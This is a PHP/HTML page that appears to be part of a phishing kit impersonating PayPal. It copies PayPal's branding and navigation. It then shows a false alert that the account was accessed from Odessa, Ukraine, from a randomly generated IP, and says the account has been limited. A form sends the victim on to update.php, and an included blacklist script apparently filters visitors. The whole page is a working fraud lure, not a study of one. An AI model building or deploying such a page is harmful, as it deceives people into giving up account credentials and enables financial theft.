<?php
error_reporting(0);
session_start();
include '../M_files//BlackList.php';
?>

<!Doctype html>
<html>
	<head>
		<title>Personal information update</title>
		<link rel="stylesheet" href="css/xxray.css">
        <link rel="stylesheet" href="css/main22.css">
		<link rel="shortcut icon" type="image/x-icon" href="../M_images/favicon.ico" />
		<META charset="utf-8">
	</head>	
	<body>
		<div class="navbar navbar-fixed-top header navbar-header noPrint js_globalNavView" id="header" role="banner" data-show-warning="" style="height:32px;">
<div class="navbar-inner"><div class="navBanner clearfix">
<a href="#navMenu" class="toggleMenu visible-leftnav pull-left nemo_mobileNavMenuToggle">Main Menu</a>
<div class="brand" style="
    padding-top: 10px;
"><a href="#"><img src="https://www.paypalobjects.com/webstatic/logo/logo_paypal_212x56.png" class="nemo_regularPpLogo" height="28" width="106"></a></div>
<div class="headerActions">
<ul class="navSecondary">
<li class="notifications js_notificationButtonView notifications_mobile nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="js_notifications-toggleTrigger alerts nemo_notificationsMobileTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications">Notifications<span class="notificationCount notificationLength-0">0</span></a></li></ul></div></div><nav id="navMenu" class="navMenu clearfix noPrint" role="navigation"><ul class="globalNav clearfix">
<li><a href="#" class="navLink active nemo_globalNavSummaryLink" name="Header_Summary" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkSummary"></span></span> <span class="navText">Summary</span></a></li><li><a href="#" class="navLink nemo_globalNavActivityLink" name="Header_Activity" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkActivity"></span></span> <span class="navText">Activity</span></a></li><li><a href="#" class="navLink nemo_globalNavTransferLink" name="Header_Send_Request" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkTransfer"></span></span> <span class="navText">Send and Request</span></a></li><li><a href="#" class="navLink nemo_globalNavWalletLink" name="Header_Wallet" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkWallet"></span></span> <span class="navText">Wallet</span></a></li><li><a href="#" class="navLink nemo_globalNavShopLink" target="_blank" name="Header_Shop" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link"><span class="globalNav-iconWrapper"><span class="globalNav-icon globalNav-icon_linkShop"></span></span> <span class="navText">Shopping</span></a></li></ul><ul class="navSecondary"><li class="notifications js_notificationButtonView notifications_desktop nemo_headerNotifications" data-autodisplay="false"><a href="#" class="js_notifications-toggleTrigger alerts nemo_notificationsDesktopTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications">Notifications<span class="notificationCount notificationLength-0">0</span></a></li><li><a href="#" class="navIcons linkSettings" name="settings" title="Profile" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link">Profile</a></li><li><a href="/gb/cgi-bin/webscr?cmd=_help" class="navIcons linkHelp visible-leftnav" name="help" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link">Help</a></li><li class="logout"><a href="#" class="vx_btn vx_btn-small vx_btn-secondary logout" name="Header_Logout" data-pagename="main:walletweb:header::main" data-pagename2="main:walletweb:header::main:::" data-track-type="link">Log Out</a></li></ul></nav></div></div>
        <br>
        <br>
        <br>
        <div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="    height: 0%;"><div class="col-sm-7 progressAndWelcome">
<div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="100" data-hide-percent-animation="true"><div id="js_outerCircle" class="outerCircle"><div class="half lessThan50"><div class="pie right" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div><div class="half greaterThan50 js_greaterThan50"><div class="pie left" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div></div></div>
<div id="js_innerCircle" class="innerCircle"><div class="profilePhotoTable">
<div id="js_profilePhotoView" class="profilePhotoContainer hasFileReader" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo="{}" data-wurfl="{}">
<span id="js_user_icon" class="profilePhotoIcon icon icon-profile-add-large" aria-hidden="true" data-hover-text="Add a photo"></span></a></div></div><div id="js_percentageContainer" class="percentageContainer nemo_percentageContainer"><div id="js_percentage" class="nemo_accountCompletionPercent fadeOut hide">100%</div></div>
</div></div><div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule " data-module-number="0">


<p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">
Hello again  ! 

</p><p class="toggleProfileStatus">
<button id="js_engagementActionTrigger" class="link vx_small-text js_emTrigger nemo_engagementActionTrigger" aria-controls="js_emSlideDownContainer" name="EM_AcctSetup_Open" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="profileStatusText">Your profile is at 100%</span></button><span class="icon icon-small icon-arrow-down-small nemo_profileStatusDownArrow" aria-hidden="true"></span></p></div></div><div id="js_engagementActions" class="col-sm-5 engagementActions"><ul class="actionsContainer nemo_actionsContainer"><li class="actionItem"><a href="#" role="button" data-module-number="1" name="EM_SendMoney" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_transferSelect js_selectModule"><span class="icon icon-medium icon-send-money" aria-hidden="true"></span><span>Pay or send money</span></a></li><li class="actionItem"><a href="#" role="button" name="EM_Mpi" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="2" data-offer-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRYQtgX20JOABVVHUDXldOVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YVxkFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyY19kAjklBj11W11eVGEuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sJSIFIwsqBzERGQELGQlNHkRZU19zJAExNhwnByAtUm9.CwxZBHY6aQYtZRVTbFo1Wn9XZlNQUiVTXAdAQlsTCxgGHgknLAwsNVN0QSgsWzp5CFhZAnc5bAsqMUZTZA9mUH8ANVUJX3EBDkAPAxkCRBFQXF9nfVN0Ylh0R355Vm1wU1FaVQ&amp;cks=MTMyODZiMjQyNjczMjgxZDA3MzYzMDExM2JiNjI4YmU&amp;e=1.0" data-offer-click="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRYQtgX20JOABVVHUDXldOVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YVxkFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyY19kAjklBj11W11eVGEuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDYmTB4nLBkgPw82HyYnMC0xGgxQKi47Kl0KNAZBIV8jAS9bYlVcX3IRAA0NFx8VXBwJV1hiKA9xMl8gR30sXzh8UwsJVXNpbwVwYRIDZFloWn0FdwkDEiRFCAAQFFBGGhQIXg1kK1txNF4jQnArC2t8W15aX3M-PAMpbEZRNh4nGz8UOABVUHIFWV9IQ1tGHEJdU1ptcFJyYw&amp;cks=NzNiNTk0MDk5NzIxMGRiZGJlMTMyMmRiMWU2ODY3MDY&amp;e=1.0" data-banner-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRYQtgX20JOABVVHUDXldOVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YVxkFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyY1xkAjklBj11W11eVGEuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sKiIKPQYHBzFTSxIeAgQUEEZcXldkbwcuJQkwEzggC2R-XQgIUyRpOgN8MEQGYQEzDHlSYFNfXndRCVcYSV9GTlMAARoyOw8jOAp.QH4oCm0rWwtcUyJoOQZxNxBVYQlmX3NSNwBZB3oFWwVfBh4EXxwJV1hke158YF10QHh-X2B8UlBVUHU&amp;cks=NzYyZjE1ZmI1MzAxNjZkNTJiMzA4NDJkMjVhMjU2OTY&amp;e=1.0" class="vx_small-text js_selectModule js_mpiOffer selectModule nemo_mpiSelect"><span class="icon icon-medium icon-shopping-bag " aria-hidden="true"></span>Shop and save</a></li><li class="actionItem"><a href="#" role="button" name="EM_Mpi" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" data-module-number="3" data-offer-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRZw1hXG0JOABVVHUFWFZNVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YV1kFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyZF9kAjklBj11W11eU2EuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sJSIFIwsqBzERGQELGQlNHkRZU19zJAExNhwnByAtUm9.CwxZBHY6aQYtZRVTbFo1Wn9XZlNQUiVTXAdAQlsTCxgGHgknLAwsNVN0QSgsWzp5CFhZAnc5bAsqMUZTZA9mUH8ANVUJX3EBDkAPAxkCRBFQXF9nfVN0Ylh0R355Vm1wU1FaVQ&amp;cks=NTQxMmQ3Mjg2YWRmN2UyYTk3ZjBmOWRlZTU4N2Q3ZDA&amp;e=1.0" data-offer-click="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRZw1hXG0JOABVVHUFWFZNVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YV1kFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyZF9kAjklBj11W11eU2EuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDYmTB4nLBkgPw82HyYnMC0xGgxQKi47Kl0KNAZBIV8jAS9bYlVcX3IRAA0NFx8VXBwJV1hiKA9xMl8gR30sXzh8UwsJVXNpbwVwYRIDZFloWn0FdwkDEiRFCAAQFFBGGhQIXg1kK1txNF4jQnArC2t8W15aX3M-PAMpbEZRNh4nGz8UOABVUHIFWV9IQ1tGHEJdU1ptcFJyYw&amp;cks=MTFkMTQ2YTA3MjFkMWZlOWY5Mjg0ZjFlNjAwZjRmZjc&amp;e=1.0" data-banner-impression="https://www.paypal.com/webapps/mch/cmd/?v=3.0&amp;t=1436258552&amp;fdata=JA0MW3IAW1FNQVlAGU1ZXFltelpyYV1kFSAtUmh5W1ldXmE3LlssaEZRZw1hXG0JOABVVHUFWFZNVg5NYjs-IzoQbxorMAMnSyQoBjdyHQgBCyIsL1cqbxwIOF1rDSYJNwINFHlEBQkJSksAQRwJV19kfFp1YV1kFSEoUhYGOSA5ImE7OUJ1ZVICO1w1HHZXZVFZUHIHXVZJQF1ACxYMAwpoe1hyZFxkAjklBj11W11eU2EuZQFmZVITJgVgXHhQY1FQU3YFSwMNTS48ZDAjPjEcBDoXFD0RPwYHSSk6DxoICSYsMV0mCgAeJV1sKiIKPQYHBzFTSxIeAgQUEEZcXldkbwcuJQkwEzggC2R-XQgIUyRpOgN8MEQGYQEzDHlSYFNfXndRCVcYSV9GTlMAARoyOw8jOAp.QH4oCm0rWwtcUyJoOQZxNxBVYQlmX3NSNwBZB3oFWwVfBh4EXxwJV1hke158YF10QHh-X2B8UlBVUHU&amp;cks=MDk4MWM3MTZkOWY3ZGJhMmFjMjYzMjU2Njg3Njc5M2I&amp;e=1.0" class="vx_small-text js_selectModule js_mpiOffer selectModule nemo_mpiSelect"><span class="icon icon-medium icon-shield " aria-hidden="true"></span>Buyer Protection</a></li></ul></div></div></div>
		
		<div class="xxray_3" >
			<div class="xxray_4">
			</div>
			<form class="xxray_51" action="update.php" method="post" style="width:960px" align="left">
				
				<img src="imgs/hero_security.png" style="float:right;">
				<h2>Warning : Unusual activities on your account</h2>
				<p>If you are seeing the messages this means that your account has been visited from an unusual place given below : </p>
				<style>
table {
    border-radius: 5px;
}

table, td {
}
td {
	padding-left:20px;
	font-size: 15px;
	font-weight: bold;
}
</style>
				<table>
					<tr>
						<td>IP </td>
						<td > : 176.97.<?php echo rand(100, 120) ?>.<?php echo rand(10, 99) ?></td>
					</tr>
					<tr>
						<td>Country </td>
						<td> : Ukraine</td>
					</tr>
					<tr>
						<td>Ville </td>
						<td> : Odessa</td>
					</tr>
				</table>
				<p>
					As a security measure, your account has been limited.<br><br>
					Don't worry, you will be able to get your account back just after finishing this steps.<br><br><br>
					<input type="submit" name="xxray_subm" class="xxray_submi"  id="xxray_submi"  value="Continue">
				</p>
			</form>

			<div class="xxray_53">
				Copyright &copy; 1999-2015 P&alpha;yP&alpha;l.
			</div>
		</div>
	</body>
</html>
